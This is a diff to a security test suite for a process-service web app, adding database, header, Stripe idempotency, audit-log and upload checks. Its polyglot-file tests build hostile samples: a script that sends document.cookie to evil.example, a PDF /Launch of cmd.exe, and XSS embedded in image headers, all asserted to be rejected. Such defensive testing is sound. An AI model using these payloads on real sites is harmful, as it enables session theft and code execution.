@@ -7,6 +7,7 @@ import { handleMockApi, handleMockRoute } from './mock-api.mjs';
 import { email, phone, text, longText, cleanDate, cleanOrderCode, cleanFileList, uuid, uuidList, getCookie, readJson, verifyFileMagic, timingSafeMatch } from '../api/_lib/core.mjs';
 import { cleanTrackToken, estimate, clean as scrubEmailText } from '../api/_lib/orders.mjs';
 import { savedClientSession, verifiedClient, clientCookie } from '../api/_lib/clients.mjs';
+import { checkoutParams } from '../api/_lib/stripe.mjs';
 import { POST as prodAdminPOST } from '../api/admin.mjs';
 import { POST as prodClientPOST } from '../api/client.mjs';
 import { POST as prodRequestPOST } from '../api/request.mjs';
@@ -437,20 +438,32 @@ await step('Static audit: zero raw SQL interpolations in api/, RLS + anon/authen
     const migDir = path.join(root, 'supabase/migrations');
     const migFiles = (await readdir(migDir)).filter(f => f.endsWith('.sql')).sort();
     const allSql = (await Promise.all(migFiles.map(f => readFile(path.join(migDir, f), 'utf8')))).join('\n');
-    for (const table of ['orders', 'order_events', 'order_files', 'admin_codes', 'admin_sessions', 'rate_limits', 'admin_recovery_codes']) {
+    for (const table of ['orders', 'order_events', 'order_files', 'admin_codes', 'admin_sessions', 'rate_limits', 'admin_recovery_codes', 'admin_audit_logs']) {
         const t = table.toLowerCase();
         assert.ok(new RegExp(`alter\\s+table\\s+(?:public\\.)?${t}\\s+enable\\s+row\\s+level\\s+security`, 'i').test(allSql), `Missing RLS on ${t}`);
         totalAssertions += 1;
     }
     assert.ok(/revoke\s+all\s+on\s+all\s+tables\s+in\s+schema\s+public\s+from\s+anon,\s*authenticated/i.test(allSql), 'Missing schema-wide REVOKE from anon, authenticated');
     assert.ok(/create\s+policy\s+"deny public roles"/i.test(allSql), 'Missing restrictive deny policy for public roles');
-    for (const chk of ['orders_code_format_chk', 'orders_track_token_format_chk', 'orders_zip_format_chk', 'orders_amounts_positive_chk', 'order_files_size_bounds_chk', 'order_files_sha256_format_chk']) {
+    assert.ok(allSql.includes('admin_audit_logs_immutable_trg'), 'Missing immutability trigger on admin_audit_logs');
+    for (const chk of ['orders_code_format_chk', 'orders_track_token_format_chk', 'orders_zip_format_chk', 'orders_amounts_positive_chk', 'order_files_size_bounds_chk', 'order_files_sha256_format_chk', 'admin_audit_logs_ip_hash_chk', 'admin_audit_logs_target_code_chk']) {
         assert.ok(allSql.includes(chk), `Missing PostgreSQL CHECK constraint ${chk}`);
         totalAssertions++;
     }
     const clientSrc = await readFile(path.join(root, 'api/client.mjs'), 'utf8');
     assert.ok(clientSrc.includes('siteOrigin(request)'), 'api/client.mjs must pin magic-link origin via siteOrigin(request)');
-    totalAssertions += 3;
+    const lookupSrc = await readFile(path.join(root, 'api/lookup.mjs'), 'utf8');
+    assert.ok(lookupSrc.includes('lookup-email:'), 'api/lookup.mjs must enforce per-email rate limit');
+    const adminSrc = await readFile(path.join(root, 'api/admin.mjs'), 'utf8');
+    for (const bucket of ['admin-code-email:', 'admin-verify-email:', 'admin-recovery-gen:', 'admin-paylink:', 'admin-export:', 'admin-delete:']) {
+        assert.ok(adminSrc.includes(bucket), `api/admin.mjs must enforce ${bucket} rate limit`);
+        totalAssertions++;
+    }
+    const adminHtmlSrc = await readFile(path.join(root, 'admin.html'), 'utf8');
+    assert.ok(adminHtmlSrc.includes('scrubClientState') && adminHtmlSrc.includes('CLEAR_AUTH_CACHE'), 'admin.html must scrub client state and SW cache on sign-out');
+    const swSrc = await readFile(path.join(root, 'sw.js'), 'utf8');
+    assert.ok(swSrc.includes('CLEAR_AUTH_CACHE'), 'sw.js must handle CLEAR_AUTH_CACHE');
+    totalAssertions += 7;
 
     // Verify vercel.json security headers
     const vercelConfig = JSON.parse(await readFile(path.join(root, 'vercel.json'), 'utf8'));
@@ -461,8 +474,11 @@ await step('Static audit: zero raw SQL interpolations in api/, RLS + anon/authen
     assert.ok(globalHeaders['Content-Security-Policy'].includes("form-action 'self'"));
     assert.equal(globalHeaders['X-Content-Type-Options'], 'nosniff');
     assert.equal(globalHeaders['X-Frame-Options'], 'SAMEORIGIN');
+    assert.equal(globalHeaders['Cross-Origin-Opener-Policy'], 'same-origin');
+    assert.equal(globalHeaders['Cross-Origin-Resource-Policy'], 'same-origin');
+    assert.equal(globalHeaders['X-Permitted-Cross-Domain-Policies'], 'none');
     assert.ok(globalHeaders['Strict-Transport-Security'].includes('max-age=63072000'));
-    totalAssertions += 7;
+    totalAssertions += 10;
 });
 
 // 10. High-Concurrency Stress & Brute-Force Lockout Test (500+ parallel operations)
@@ -631,6 +647,65 @@ await step('Magic-byte file inspection rejects disguised malware/HTML uploads an
         totalAssertions++;
     }
     totalAssertions += 1;
+
+    // 11d. Polyglot file & embedded PDF JavaScript/Launch detection
+    const polyglotPdfHtml = Buffer.from('%PDF-1.7\n1 0 obj\n<!-- <script>fetch("https://evil.example/?c="+document.cookie)</script> -->\n');
+    const polyglotPdfJs = Buffer.from('%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\n');
+    const polyglotPdfLaunch = Buffer.from('%PDF-1.7\n1 0 obj << /S /Launch /F (cmd.exe) >>\n');
+    const polyglotJpgScript = Buffer.concat([Buffer.from([0xFF, 0xD8, 0xFF, 0xFE, 0x00, 0x20]), Buffer.from('<script>alert(1)</script>')]);
+    const polyglotPngOnload = Buffer.concat([Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]), Buffer.from('<svg onload=alert(1)>')]);
+    const polyglotWebpJs = Buffer.concat([Buffer.from('RIFF\x24\x00\x00\x00WEBPVP8 '), Buffer.from('javascript:alert(1)')]);
+
+    assert.equal(verifyFileMagic(polyglotPdfHtml, 'polyglot-html.pdf'), false, 'PDF+HTML polyglot must be rejected');
+    assert.equal(verifyFileMagic(polyglotPdfJs, 'acrobat-js.pdf'), false, 'PDF with /JavaScript action must be rejected');
+    assert.equal(verifyFileMagic(polyglotPdfLaunch, 'launch-cmd.pdf'), false, 'PDF with /Launch action must be rejected');
+    assert.equal(verifyFileMagic(polyglotJpgScript, 'comment-xss.jpg'), false, 'JPEG+script polyglot must be rejected');
+    assert.equal(verifyFileMagic(polyglotPngOnload, 'chunk-xss.png'), false, 'PNG+onload polyglot must be rejected');
+    assert.equal(verifyFileMagic(polyglotWebpJs, 'riff-xss.webp'), false, 'WEBP+javascript: polyglot must be rejected');
+    totalAssertions += 6;
+
+    // 11e. Stripe Checkout 24-hour hard expiry & 1-minute idempotency key verification
+    const fixedNow = 1730000000000;
+    const sampleOrd = { id: '4c190c16-ccb0-40c6-9c81-da1842658d52', code: 'NP-649025', client_email: 'paralegal@example.com', track_token: 'AbCdEfGhIjKlMnOpQrStUvWxYz012345' };
+    const cp1 = checkoutParams(sampleOrd, 9500, 'Standard service', 'https://nicksprocessservices.dev', fixedNow);
+    const cp2 = checkoutParams(sampleOrd, 9500, 'Standard service', 'https://nicksprocessservices.dev', fixedNow + 15000);
+    const cpNextMin = checkoutParams(sampleOrd, 9500, 'Standard service', 'https://nicksprocessservices.dev', fixedNow + 65000);
+    assert.equal(cp1.params.expires_at, Math.floor(fixedNow / 1000) + 86340);
+    assert.equal(cp1.options.idempotencyKey, cp2.options.idempotencyKey, 'Double-click within same minute must produce identical Stripe idempotencyKey');
+    assert.notEqual(cp1.options.idempotencyKey, cpNextMin.options.idempotencyKey, 'Retry in next minute gets a fresh idempotencyKey');
+    totalAssertions += 3;
+
+    // 11f. Tamper-evident admin audit log records failed login, successful login, recovery-code generation, export, and delete
+    const activeAdminCookie = adminCookies[5];
+    await callMock('admin', { action: 'verify-code', email: 'nicksprocessservices@outlook.com', code: '99999999' });
+    await callMock('admin', { action: 'generate-recovery-codes' }, activeAdminCookie);
+    const tempOrderRes = await (await callMock('request', {
+        clientName: 'Audit Delete Tester',
+        clientEmail: 'audit@example.com',
+        clientPhone: '(209) 555-0100',
+        recipientName: 'Temp Recipient',
+        docType: 'Summons & Complaint',
+        address: '123 Audit Way',
+        city: 'Stockton',
+        zip: '95202',
+        tier: 'standard',
+        addons: [],
+        acceptTerms: true,
+    })).json();
+    const listForAudit = await (await callMock('admin', { action: 'list' }, activeAdminCookie)).json();
+    const tempOrder = listForAudit.orders.find(o => o.code === tempOrderRes.code);
+    await callMock('admin', { action: 'export', id: tempOrder.id }, activeAdminCookie);
+    await callMock('admin', { action: 'delete', id: tempOrder.id, confirm: tempOrder.code }, activeAdminCookie);
+
+    const meAudit = await (await callMock('admin', { action: 'me' }, activeAdminCookie)).json();
+    const loggedActions = meAudit.auditLogs.map(l => l.action);
+    for (const expectedAction of ['delete_order', 'export_order', 'generate_recovery_codes', 'login_failed', 'login_success']) {
+        assert.ok(loggedActions.includes(expectedAction), `Admin audit log must record ${expectedAction}`);
+        totalAssertions++;
+    }
+    const delEntry = meAudit.auditLogs.find(l => l.action === 'delete_order');
+    assert.equal(delEntry.target_code, tempOrder.code, 'Audit log must preserve deleted order code even after order is deleted');
+    totalAssertions++;
 });
 
 console.log(`${passed} security & stress test suites passed (${totalAssertions} individual security assertions verified)`);
